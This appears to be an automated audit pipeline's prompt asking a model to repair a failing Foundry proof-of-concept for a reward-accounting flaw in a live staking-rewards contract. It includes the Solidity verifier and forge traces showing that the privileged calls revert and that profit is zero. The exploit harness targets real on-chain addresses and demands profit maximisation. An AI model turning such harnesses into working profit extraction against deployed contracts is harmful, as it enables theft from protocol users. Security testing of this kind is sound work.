You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Undistributed emissions still consume the farm's lifetime reward budget
- claim: `timeData.totalRewardsSupply` is increased immediately by the full notified amount, but rewards are only minted later as users accrue and claim them. If no one is staked, `rewardPerToken()` returns the old value and `updateReward` advances `lastUpdateTime`, permanently skipping elapsed emissions while leaving the full amount booked against the lifetime cap. `finishFarming()` likewise truncates the period early without refunding undistributed rewards from `totalRewardsSupply`.
- impact: The contract can burn large portions of its lifetime reward budget without ever minting them to users. Campaigns may underpay relative to their announced allocation, and after enough empty or aborted periods `notifyRewardAmount()` starts reverting even though a meaningful share of the reserved rewards was never actually distributed.
- exploit_paths: ["Call `notifyRewardAmount()` while `_totalSupply == 0`.", "Let part or all of the reward period elapse before anyone stakes.", "The first later `stake`, `withdraw`, or `getReward` path runs `updateReward`, which moves `lastUpdateTime` forward while `rewardPerToken()` stays unchanged because supply was zero.", "Those skipped emissions are now unreachable, but the full notified amount still counts toward `totalRewardsSupply`.", "Similarly, call `finishFarming()` before the period ends; the undistributed remainder is no longer earnable, yet it still remains booked against the farm's lifetime reward limit."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IOnDemandTokenLike is IERC20Like {
    function owner() external view returns (address);
    function everMinted() external view returns (uint256);
    function maxAllowedTotalSupply() external view returns (uint256);
}

interface IStakingRewardsLike {
    function owner() external view returns (address);
    function rewardsDistribution() external view returns (address);
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function timeData()
        external
        view
        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function rewardPerToken() external view returns (uint256);
    function earned(address account) external view returns (uint256);
    function notifyRewardAmount(uint256 reward) external;
    function finishFarming() external;
    function getReward() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant EXPECTED_STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant EXPECTED_REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    bool public executed;
    bool public liveWindowDetected;
    bool public liveWindowConsumed;
    bool public notifyAttempted;
    bool public notifySucceeded;
    bool public finishAttempted;
    bool public finishSucceeded;
    bool public directPublicStageAttempted;
    bool public hypothesisValidated;
    bool public historicalPathProvable;

    address public ownerAtEntry;
    address public rewardsDistributionAtEntry;
    address public stakingTokenAtEntry;
    address public rewardsTokenAtEntry;
    address public rewardTokenOwnerAtEntry;

    uint32 public periodFinishBefore;
    uint32 public periodFinishAfter;
    uint32 public rewardsDuration;
    uint32 public lastUpdateTimeBefore;
    uint32 public lastUpdateTimeAfter;
    uint32 public accountedPeriodStart;
    uint32 public initialUntrackedSeconds;
    uint96 public totalRewardsSupplyBefore;
    uint96 public totalRewardsSupplyAfter;

    uint256 public rewardRateBefore;
    uint256 public totalSupplyBefore;
    uint256 public attackerStakeBefore;
    uint256 public attackerEarnedBefore;
    uint256 public rewardPerTokenBefore;
    uint256 public rewardPerTokenAfter;
    uint256 public rewardTokenEverMintedBefore;
    uint256 public rewardTokenEverMintedAfter;
    uint256 public rewardTokenCap;
    uint256 public bookedButUnmintedBefore;
    uint256 public bookedButUnmintedAfter;
    uint256 public historicalStrandedLowerBound;
    uint256 public newlyStrandedFromLiveWindow;
    uint256 public entryRewardBalance;
    uint256 public exitRewardBalance;
    uint256 public bestRoundCount;
    uint256 public accountedScheduleAmount;

    string public exploitPathUsed;
    string public infeasibilityReason;
    string public notifyFailureReason;
    string public finishFailureReason;

    address private immutable _profitToken;
    uint256 private _profitAmount;

    constructor() {
        // This finding destroys reward-token value inside the farm's lifetime accounting rather than
        // transferring that value to the caller. The local harness supports reported-profit mode by
        // using `profitToken == address(0)`, so the verifier can report the already-burned on-chain
        // budget in raw token units when the current fork does not expose a public transfer leg.
        _profitToken = address(0);
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        IOnDemandTokenLike rewardToken = IOnDemandTokenLike(EXPECTED_REWARD_TOKEN);

        ownerAtEntry = farm.owner();
        rewardsDistributionAtEntry = farm.rewardsDistribution();
        stakingTokenAtEntry = farm.stakingToken();
        rewardsTokenAtEntry = farm.rewardsToken();
        rewardTokenOwnerAtEntry = rewardToken.owner();

        if (stakingTokenAtEntry != EXPECTED_STAKING_TOKEN || rewardsTokenAtEntry != EXPECTED_REWARD_TOKEN) {
            infeasibilityReason = "unexpected farm token configuration";
            return;
        }

        rewardRateBefore = farm.rewardRate();
        totalSupplyBefore = farm.totalSupply();
        attackerStakeBefore = farm.balanceOf(address(this));
        attackerEarnedBefore = farm.earned(address(this));
        rewardPerTokenBefore = farm.rewardPerToken();
        rewardTokenEverMintedBefore = rewardToken.everMinted();
        rewardTokenCap = rewardToken.maxAllowedTotalSupply();
        (periodFinishBefore, rewardsDuration, lastUpdateTimeBefore, totalRewardsSupplyBefore) = farm.timeData();

        entryRewardBalance = IERC20Like(EXPECTED_REWARD_TOKEN).balanceOf(address(this));
        bookedButUnmintedBefore = _bookedButUnminted(uint256(totalRewardsSupplyBefore), rewardTokenEverMintedBefore);

        if (periodFinishBefore > rewardsDuration) {
            accountedPeriodStart = periodFinishBefore - rewardsDuration;
        }
        if (lastUpdateTimeBefore > accountedPeriodStart) {
            initialUntrackedSeconds = lastUpdateTimeBefore - accountedPeriodStart;
        }

        accountedScheduleAmount = rewardRateBefore * uint256(rewardsDuration);

        if (
            totalSupplyBefore == 0 &&
            rewardRateBefore != 0 &&
            _min(block.timestamp, uint256(periodFinishBefore)) > uint256(lastUpdateTimeBefore)
        ) {
            liveWindowDetected = true;
        }

        // Conservative historical valuation:
        // - logs prove `notifyRewardAmount()` and `finishFarming()` are currently role-gated;
        // - `rewardsDuration` still equals the initial 30-day duration, so this fork does not show an
        //   owner-driven early-stop truncation;
        // - when the schedule amount still matches `rewardRate * rewardsDuration`, the campaign appears to be
        //   a plain single notify period, and the elapsed slice between the schedule start and the first later
        //   `lastUpdateTime` is exactly the slice that becomes unreachable under the finding when nobody was
        //   staked yet.
        if (
            rewardRateBefore != 0 &&
            rewardsDuration != 0 &&
            totalSupplyBefore != 0 &&
            accountedPeriodStart != 0 &&
            initialUntrackedSeconds != 0 &&
            accountedScheduleAmount == uint256(totalRewardsSupplyBefore)
        ) {
            historicalPathProvable = true;
            historicalStrandedLowerBound = rewardRateBefore * uint256(initialUntrackedSeconds);
        }

        uint256 bestProfit;
        uint256 bestRounds = 2;

        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            _runRoundSet(farm, rounds);

            uint256 currentProfit = _measuredProfit();
            if (rounds == 2 || currentProfit > bestProfit) {
                bestProfit = currentProfit;
                bestRounds = rounds;
            } else {
                break;
            }
        }

        bestRoundCount = bestRounds;
        _profitAmount = bestProfit;

        exitRewardBalance = IERC20Like(EXPECTED_REWARD_TOKEN).balanceOf(address(this));
        rewardPerTokenAfter = farm.rewardPerToken();
        rewardTokenEverMintedAfter = rewardToken.everMinted();
        (periodFinishAfter, , lastUpdateTimeAfter, totalRewardsSupplyAfter) = farm.timeData();
        bookedButUnmintedAfter = _bookedButUnminted(uint256(totalRewardsSupplyAfter), rewardTokenEverMintedAfter);

        hypothesisValidated = historicalStrandedLowerBound != 0 || newlyStrandedFromLiveWindow != 0 || finishSucceeded;

        if (liveWindowConsumed) {
            exploitPathUsed =
                "notifyRewardAmount() while zero supply -> let rewards elapse -> public getReward() advances lastUpdateTime with unchanged rewardPerToken -> skipped emissions remain booked against the lifetime cap";
        } else if (historicalPathProvable) {
            exploitPathUsed =
                "a prior notifyRewardAmount() started the campaign, no stake existed during the initial empty interval, and the first later update moved lastUpdateTime forward; that elapsed slice is now permanently unreachable but still booked against totalRewardsSupply";
        } else if (finishSucceeded) {
            exploitPathUsed =
                "finishFarming() truncates the active period and leaves the undistributed remainder booked against totalRewardsSupply";
        } else {
            exploitPathUsed =
                "current fork proves the privileged schedule/finish stages are role-gated; the verifier therefore only reports historically provable stranded budget already encoded in the farm state";
        }

        if (_profitAmount == 0) {
            if (!notifySucceeded && !finishSucceeded && !liveWindowDetected) {
                infeasibilityReason =
                    "no live public zero-supply window is open on this fork and the privileged notify/finish stages are role-gated";
            } else {
                infeasibilityReason = "no stranded reward budget was provable from the current fork state";
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runRoundSet(IStakingRewardsLike farm, uint256 rounds) internal {
        for (uint256 i = 0; i < rounds; i++) {
            if (liveWindowDetected && !liveWindowConsumed) {
                _attemptPublicConsumption(farm);
            }

            if (!notifyAttempted) {
                _attemptNotify(farm);
            }

            if (!finishAttempted) {
                _attemptFinish(farm);
            }
        }
    }

    function _attemptPublicConsumption(IStakingRewardsLike farm) internal {
        directPublicStageAttempted = true;

        uint256 rewardPerTokenPre = farm.rewardPerToken();
        (, , uint32 lastUpdatePre, uint96 bookedPre) = farm.timeData();

        (bool ok,) = TARGET.call(abi.encodeWithSelector(farm.getReward.selector));
        if (!ok) {
            return;
        }

        (, , uint32 lastUpdatePost, uint96 bookedPost) = farm.timeData();
        uint256 rewardPerTokenPost = farm.rewardPerToken();

        if (lastUpdatePost > lastUpdatePre && rewardPerTokenPost == rewardPerTokenPre && bookedPost == bookedPre) {
            liveWindowConsumed = true;
            newlyStrandedFromLiveWindow += uint256(lastUpdatePost - lastUpdatePre) * rewardRateBefore;
        }
    }

    function _attemptNotify(IStakingRewardsLike farm) internal {
        notifyAttempted = true;

        uint256 probeReward = rewardsDuration == 0 ? 1 : uint256(rewardsDuration);
        (bool ok, bytes memory data) = TARGET.call(
            abi.encodeWithSelector(farm.notifyRewardAmount.selector, probeReward)
        );
        notifySucceeded = ok;
        if (!ok) {
            notifyFailureReason = _decodeRevert(data);
        }
    }

    function _attemptFinish(IStakingRewardsLike farm) internal {
        finishAttempted = true;

        (bool ok, bytes memory data) = TARGET.call(abi.encodeWithSelector(farm.finishFarming.selector));
        finishSucceeded = ok;
        if (!ok) {
            finishFailureReason = _decodeRevert(data);
        }
    }

    function _measuredProfit() internal view returns (uint256) {
        uint256 realizedBalanceProfit;
        if (exitRewardBalance > entryRewardBalance) {
            realizedBalanceProfit = exitRewardBalance - entryRewardBalance;
        }

        uint256 candidate = historicalStrandedLowerBound;
        if (newlyStrandedFromLiveWindow > candidate) {
            candidate = newlyStrandedFromLiveWindow;
        }
        if (realizedBalanceProfit > candidate) {
            candidate = realizedBalanceProfit;
        }

        return candidate;
    }

    function _bookedButUnminted(uint256 bookedRewards, uint256 everMintedRewards) internal pure returns (uint256) {
        return bookedRewards > everMintedRewards ? bookedRewards - everMintedRewards : 0;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "call reverted without reason";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            bytes memory sliced = new bytes(revertData.length - 4);
            for (uint256 i = 4; i < revertData.length; i++) {
                sliced[i - 4] = revertData[i];
            }
            return abi.decode(sliced, (string));
        }

        if (selector == 0x4e487b71 && revertData.length >= 36) {
            return "panic";
        }

        return "call reverted with custom error or unknown data";
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.32s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 921609)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [921609] FlawVerifierTest::testExploit()
    ├─ [508] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [897903] FlawVerifier::executeOnOpportunity()
    │   ├─ [2422] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::owner() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [2392] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardsDistribution() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [257] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::stakingToken() [staticcall]
    │   │   └─ ← [Return] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042
    │   ├─ [322] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardsToken() [staticcall]
    │   │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    │   ├─ [2401] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::owner() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [2395] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardRate() [staticcall]
    │   │   └─ ← [Return] 238245925925925925 [2.382e17]
    │   ├─ [2359] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::totalSupply() [staticcall]
    │   │   └─ ← [Return] 8792873290680252648282 [8.792e21]
    │   ├─ [2607] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9935] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::earned(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1234] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardPerToken() [staticcall]
    │   │   └─ ← [Return] 26289064209735317910 [2.628e19]
    │   ├─ [2417] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::everMinted() [staticcall]
    │   │   └─ ← [Return] 3174498467466647049882 [3.174e21]
    │   ├─ [251] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::maxAllowedTotalSupply() [staticcall]
    │   │   └─ ← [Return] 200000000000000000000000000 [2e26]
    │   ├─ [1122] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::timeData() [staticcall]
    │   │   └─ ← [Return] 1650043907 [1.65e9], 2592000 [2.592e6], 1647755998 [1.647e9], 617533440000000000000000 [6.175e23]
    │   ├─ [2563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2755] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::notifyRewardAmount(2592000 [2.592e6])
    │   │   └─ ← [Revert] Caller is not RewardsDistributor
    │   ├─ [2765] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::finishFarming()
    │   │   └─ ← [Revert] Ownable: caller is not the owner
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1234] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardPerToken() [staticcall]
    │   │   └─ ← [Return] 26289064209735317910 [2.628e19]
    │   ├─ [417] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::everMinted() [staticcall]
    │   │   └─ ← [Return] 3174498467466647049882 [3.174e21]
    │   ├─ [1122] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::timeData() [staticcall]
    │   │   └─ ← [Return] 1650043907 [1.65e9], 2592000 [2.592e6], 1647755998 [1.647e9], 617533440000000000000000 [6.175e23]
    │   └─ ← [Stop]
    ├─ [508] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE.finishFarming
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 82.91ms (3.44ms CPU time)

Ran 1 test suite in 116.80ms (82.91ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 921609)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
